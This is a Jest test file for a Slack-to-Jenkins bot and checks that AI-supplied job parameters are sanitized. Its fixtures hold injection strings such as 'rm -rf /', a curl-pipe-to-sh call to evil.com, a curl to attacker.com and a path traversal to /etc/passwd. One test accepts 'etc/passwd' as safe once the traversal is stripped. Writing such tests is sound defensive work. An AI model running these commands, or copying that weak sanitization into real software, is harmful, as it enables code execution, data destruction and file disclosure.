import { jest, describe, it, expect, beforeEach, afterEach } from '@jest/globals';
import { SlackBotService } from '../../../src/services/slack-bot';
import { AIResponse } from '../../../src/types/ai';

// Mock dependencies
const mockLogger = {
  info: jest.fn(),
  warn: jest.fn(),
  error: jest.fn(),
};

jest.mock('../../../src/utils/logger', () => ({
  logger: () => mockLogger,
}));
jest.mock('../../../src/services/ai-processor');
jest.mock('../../../src/services/mcp-client');
jest.mock('../../../src/services/notification');

describe('SlackBotService - Security Tests', () => {
  let slackBotService: SlackBotService;
  let mockApp: any;
  let mockAiProcessor: any;
  let mockMcpClient: any;
  let mockNotificationService: any;
  let mockSay: jest.MockedFunction<any>;
  let mockClient: any;

  beforeEach(async () => {
    // Reset all mocks
    jest.clearAllMocks();

    // Reset logger mock
    jest.clearAllMocks();

    // Mock Slack App
    mockSay = jest.fn();
    mockClient = {
      reactions: {
        add: jest.fn(),
      },
    };
    mockApp = {
      event: jest.fn(),
      error: jest.fn(),
    };

    // Mock AI Processor
    mockAiProcessor = {
      processMessage: jest.fn(),
      getConfidenceThreshold: jest.fn(() => 0.8),
    };

    // Mock MCP Client
    mockMcpClient = {
      triggerJenkinsJob: jest.fn(),
    };

    // Mock Notification Service
    mockNotificationService = {};


    // Create service instance
    slackBotService = new SlackBotService(
      mockApp,
      mockAiProcessor,
      mockMcpClient,
      mockNotificationService
    );

    // Initialize to register event handlers
    await slackBotService.initialize();
  });

  afterEach(() => {
    jest.restoreAllMocks();
  });

  describe('Parameter Sanitization Integration', () => {
    const createMockEvent = (aiResponse: AIResponse) => {
      mockAiProcessor.processMessage.mockResolvedValue(aiResponse);
      mockMcpClient.triggerJenkinsJob.mockResolvedValue({
        buildNumber: 123,
        jobName: 'test-job',
        status: 'SUCCESS',
      });

      return {
        event: {
          text: 'deploy app',
          channel: 'C123456',
          ts: '1234567890.123',
          user: 'U123456',
        },
        client: mockClient,
        say: mockSay,
      };
    };

    it('should sanitize and pass valid parameters', async () => {
      // Arrange
      const aiResponse: AIResponse = {
        jobName: 'deploy-app',
        parameters: {
          branch: 'main',
          environment: 'production',
          version: '1.2.3',
        },
        confidence: 0.9,
      };

      const mockEvent = createMockEvent(aiResponse);

      // Get the handler function that was registered
      const handlerCall = mockApp.event.mock.calls.find((call: any) => call[0] === 'app_mention');
      const handler = handlerCall[1];

      // Act
      await handler(mockEvent);

      // Assert
      expect(mockMcpClient.triggerJenkinsJob).toHaveBeenCalledWith({
        jobName: 'deploy-app',
        parameters: {
          branch: 'main',
          environment: 'production',
          version: '1.2.3',
        },
        callbackInfo: {
          slackChannel: 'C123456',
          slackThreadTs: '1234567890.123',
          slackUserId: 'U123456',
        },
      });

      expect(mockSay).toHaveBeenCalledWith({
        thread_ts: '1234567890.123',
        text: 'Jenkins job "deploy-app" triggered successfully! Build #123',
      });
    });

    it('should reject dangerous parameters and block execution', async () => {
      // Arrange - AI response with malicious parameters
      const aiResponse: AIResponse = {
        jobName: 'deploy-app',
        parameters: {
          branch: 'main; rm -rf /',
          malicious_script: '$(curl http://evil.com/script.sh | sh)',
          command_injection: '`whoami`',
        },
        confidence: 0.9,
      };

      const mockEvent = createMockEvent(aiResponse);
      const handlerCall = mockApp.event.mock.calls.find((call: any) => call[0] === 'app_mention');
      const handler = handlerCall[1];

      // Act
      await handler(mockEvent);

      // Assert - All dangerous parameters are rejected, so job is not triggered
      expect(mockMcpClient.triggerJenkinsJob).not.toHaveBeenCalled();

      // Should warn user about security validation failure
      expect(mockSay).toHaveBeenCalledWith({
        thread_ts: '1234567890.123',
        text: expect.stringContaining('No valid parameters remaining after sanitization'),
      });

      expect(mockLogger.warn).toHaveBeenCalledWith(
        'Parameter sanitization warnings',
        expect.objectContaining({
          warnings: expect.any(Array),
          rejected: expect.objectContaining({
            branch: expect.any(String),
            malicious_script: expect.any(String),
            command_injection: expect.any(String),
          }),
        })
      );
    });

    it('should block execution when all parameters fail validation', async () => {
      // Arrange - AI response with only invalid parameters
      const aiResponse: AIResponse = {
        jobName: 'deploy-app',
        parameters: {
          evil_param1: 'rm -rf /',
          evil_param2: '$(curl evil.com)',
          not_whitelisted: 'dangerous',
        },
        confidence: 0.9,
      };

      const mockEvent = createMockEvent(aiResponse);
      const handlerCall = mockApp.event.mock.calls.find((call: any) => call[0] === 'app_mention');
      const handler = handlerCall[1];

      // Act
      await handler(mockEvent);

      // Assert
      expect(mockMcpClient.triggerJenkinsJob).not.toHaveBeenCalled();

      expect(mockSay).toHaveBeenCalledWith({
        thread_ts: '1234567890.123',
        text: expect.stringContaining('Security validation failed'),
      });

      expect(mockLogger.error).toHaveBeenCalledWith(
        'Parameter validation failed',
        expect.any(Object)
      );
    });

    it('should enforce production branch restrictions', async () => {
      // Arrange - Production deployment with non-main branch
      const aiResponse: AIResponse = {
        jobName: 'deploy-app',
        parameters: {
          environment: 'production',
          branch: 'feature-branch',
        },
        confidence: 0.9,
      };

      const mockEvent = createMockEvent(aiResponse);
      const handlerCall = mockApp.event.mock.calls.find((call: any) => call[0] === 'app_mention');
      const handler = handlerCall[1];

      // Act
      await handler(mockEvent);

      // Assert
      expect(mockMcpClient.triggerJenkinsJob).not.toHaveBeenCalled();

      expect(mockSay).toHaveBeenCalledWith({
        thread_ts: '1234567890.123',
        text: expect.stringContaining('Production deployments must use main/master branch'),
      });
    });

    it('should handle parameter length attacks', async () => {
      // Arrange - Parameters with excessive length
      const longString = 'a'.repeat(1000);
      const aiResponse: AIResponse = {
        jobName: 'deploy-app',
        parameters: {
          branch: 'main',
          long_parameter: longString,
        },
        confidence: 0.9,
      };

      const mockEvent = createMockEvent(aiResponse);
      const handlerCall = mockApp.event.mock.calls.find((call: any) => call[0] === 'app_mention');
      const handler = handlerCall[1];

      // Act
      await handler(mockEvent);

      // Assert
      expect(mockMcpClient.triggerJenkinsJob).toHaveBeenCalledWith({
        jobName: 'deploy-app',
        parameters: {
          branch: 'main',
          // long_parameter should be filtered out
        },
        callbackInfo: expect.any(Object),
      });

      expect(mockSay).toHaveBeenCalledWith({
        thread_ts: '1234567890.123',
        text: expect.stringContaining('Some parameters were filtered for security'),
      });
    });

    it('should prevent command injection in branch names', async () => {
      // Arrange
      const aiResponse: AIResponse = {
        jobName: 'deploy-app',
        parameters: {
          branch: 'main && curl http://attacker.com',
          environment: 'staging',
        },
        confidence: 0.9,
      };

      const mockEvent = createMockEvent(aiResponse);
      const handlerCall = mockApp.event.mock.calls.find((call: any) => call[0] === 'app_mention');
      const handler = handlerCall[1];

      // Act
      await handler(mockEvent);

      // Assert - The branch with && is rejected, only environment passes
      expect(mockMcpClient.triggerJenkinsJob).toHaveBeenCalledWith({
        jobName: 'deploy-app',
        parameters: {
          environment: 'staging',
        },
        callbackInfo: {
          slackChannel: 'C123456',
          slackThreadTs: '1234567890.123',
          slackUserId: 'U123456',
        },
      });
      
      // Should warn user about filtered parameters
      expect(mockSay).toHaveBeenCalledWith({
        thread_ts: '1234567890.123',
        text: expect.stringContaining('Some parameters were filtered for security'),
      });
    });

    it('should handle path traversal attempts in config files', async () => {
      // Arrange
      const aiResponse: AIResponse = {
        jobName: 'deploy-app',
        parameters: {
          branch: 'main',
          config_file: '../../../etc/passwd',
        },
        confidence: 0.9,
      };

      const mockEvent = createMockEvent(aiResponse);
      const handlerCall = mockApp.event.mock.calls.find((call: any) => call[0] === 'app_mention');
      const handler = handlerCall[1];

      // Act
      await handler(mockEvent);

      // Assert - Path traversal is removed during sanitization
      expect(mockMcpClient.triggerJenkinsJob).toHaveBeenCalledWith({
        jobName: 'deploy-app',
        parameters: {
          branch: 'main',
          config_file: 'etc/passwd', // Path traversal removed
        },
        callbackInfo: {
          slackChannel: 'C123456',
          slackThreadTs: '1234567890.123',
          slackUserId: 'U123456',
        },
      });
    });

    it('should log security events with proper context', async () => {
      // Arrange
      const aiResponse: AIResponse = {
        jobName: 'deploy-app',
        parameters: {
          branch: 'main',
          malicious_param: '$(evil_command)',
        },
        confidence: 0.9,
      };

      const mockEvent = createMockEvent(aiResponse);
      const handlerCall = mockApp.event.mock.calls.find((call: any) => call[0] === 'app_mention');
      const handler = handlerCall[1];

      // Act
      await handler(mockEvent);

      // Assert
      expect(mockLogger.warn).toHaveBeenCalledWith(
        'Parameter sanitization warnings',
        expect.objectContaining({
          jobName: 'deploy-app',
          userId: 'U123456',
          channel: 'C123456',
          warnings: expect.arrayContaining([
            expect.stringContaining('malicious_param')
          ]),
          rejected: expect.objectContaining({
            malicious_param: '$(evil_command)'
          }),
        })
      );
    });

    it('should handle empty parameters gracefully', async () => {
      // Arrange
      const aiResponse: AIResponse = {
        jobName: 'deploy-app',
        parameters: {},
        confidence: 0.9,
      };

      const mockEvent = createMockEvent(aiResponse);
      const handlerCall = mockApp.event.mock.calls.find((call: any) => call[0] === 'app_mention');
      const handler = handlerCall[1];

      // Act
      await handler(mockEvent);

      // Assert
      expect(mockMcpClient.triggerJenkinsJob).not.toHaveBeenCalled();
      expect(mockSay).toHaveBeenCalledWith({
        thread_ts: '1234567890.123',
        text: expect.stringContaining('No valid parameters remaining after sanitization'),
      });
    });
  });
});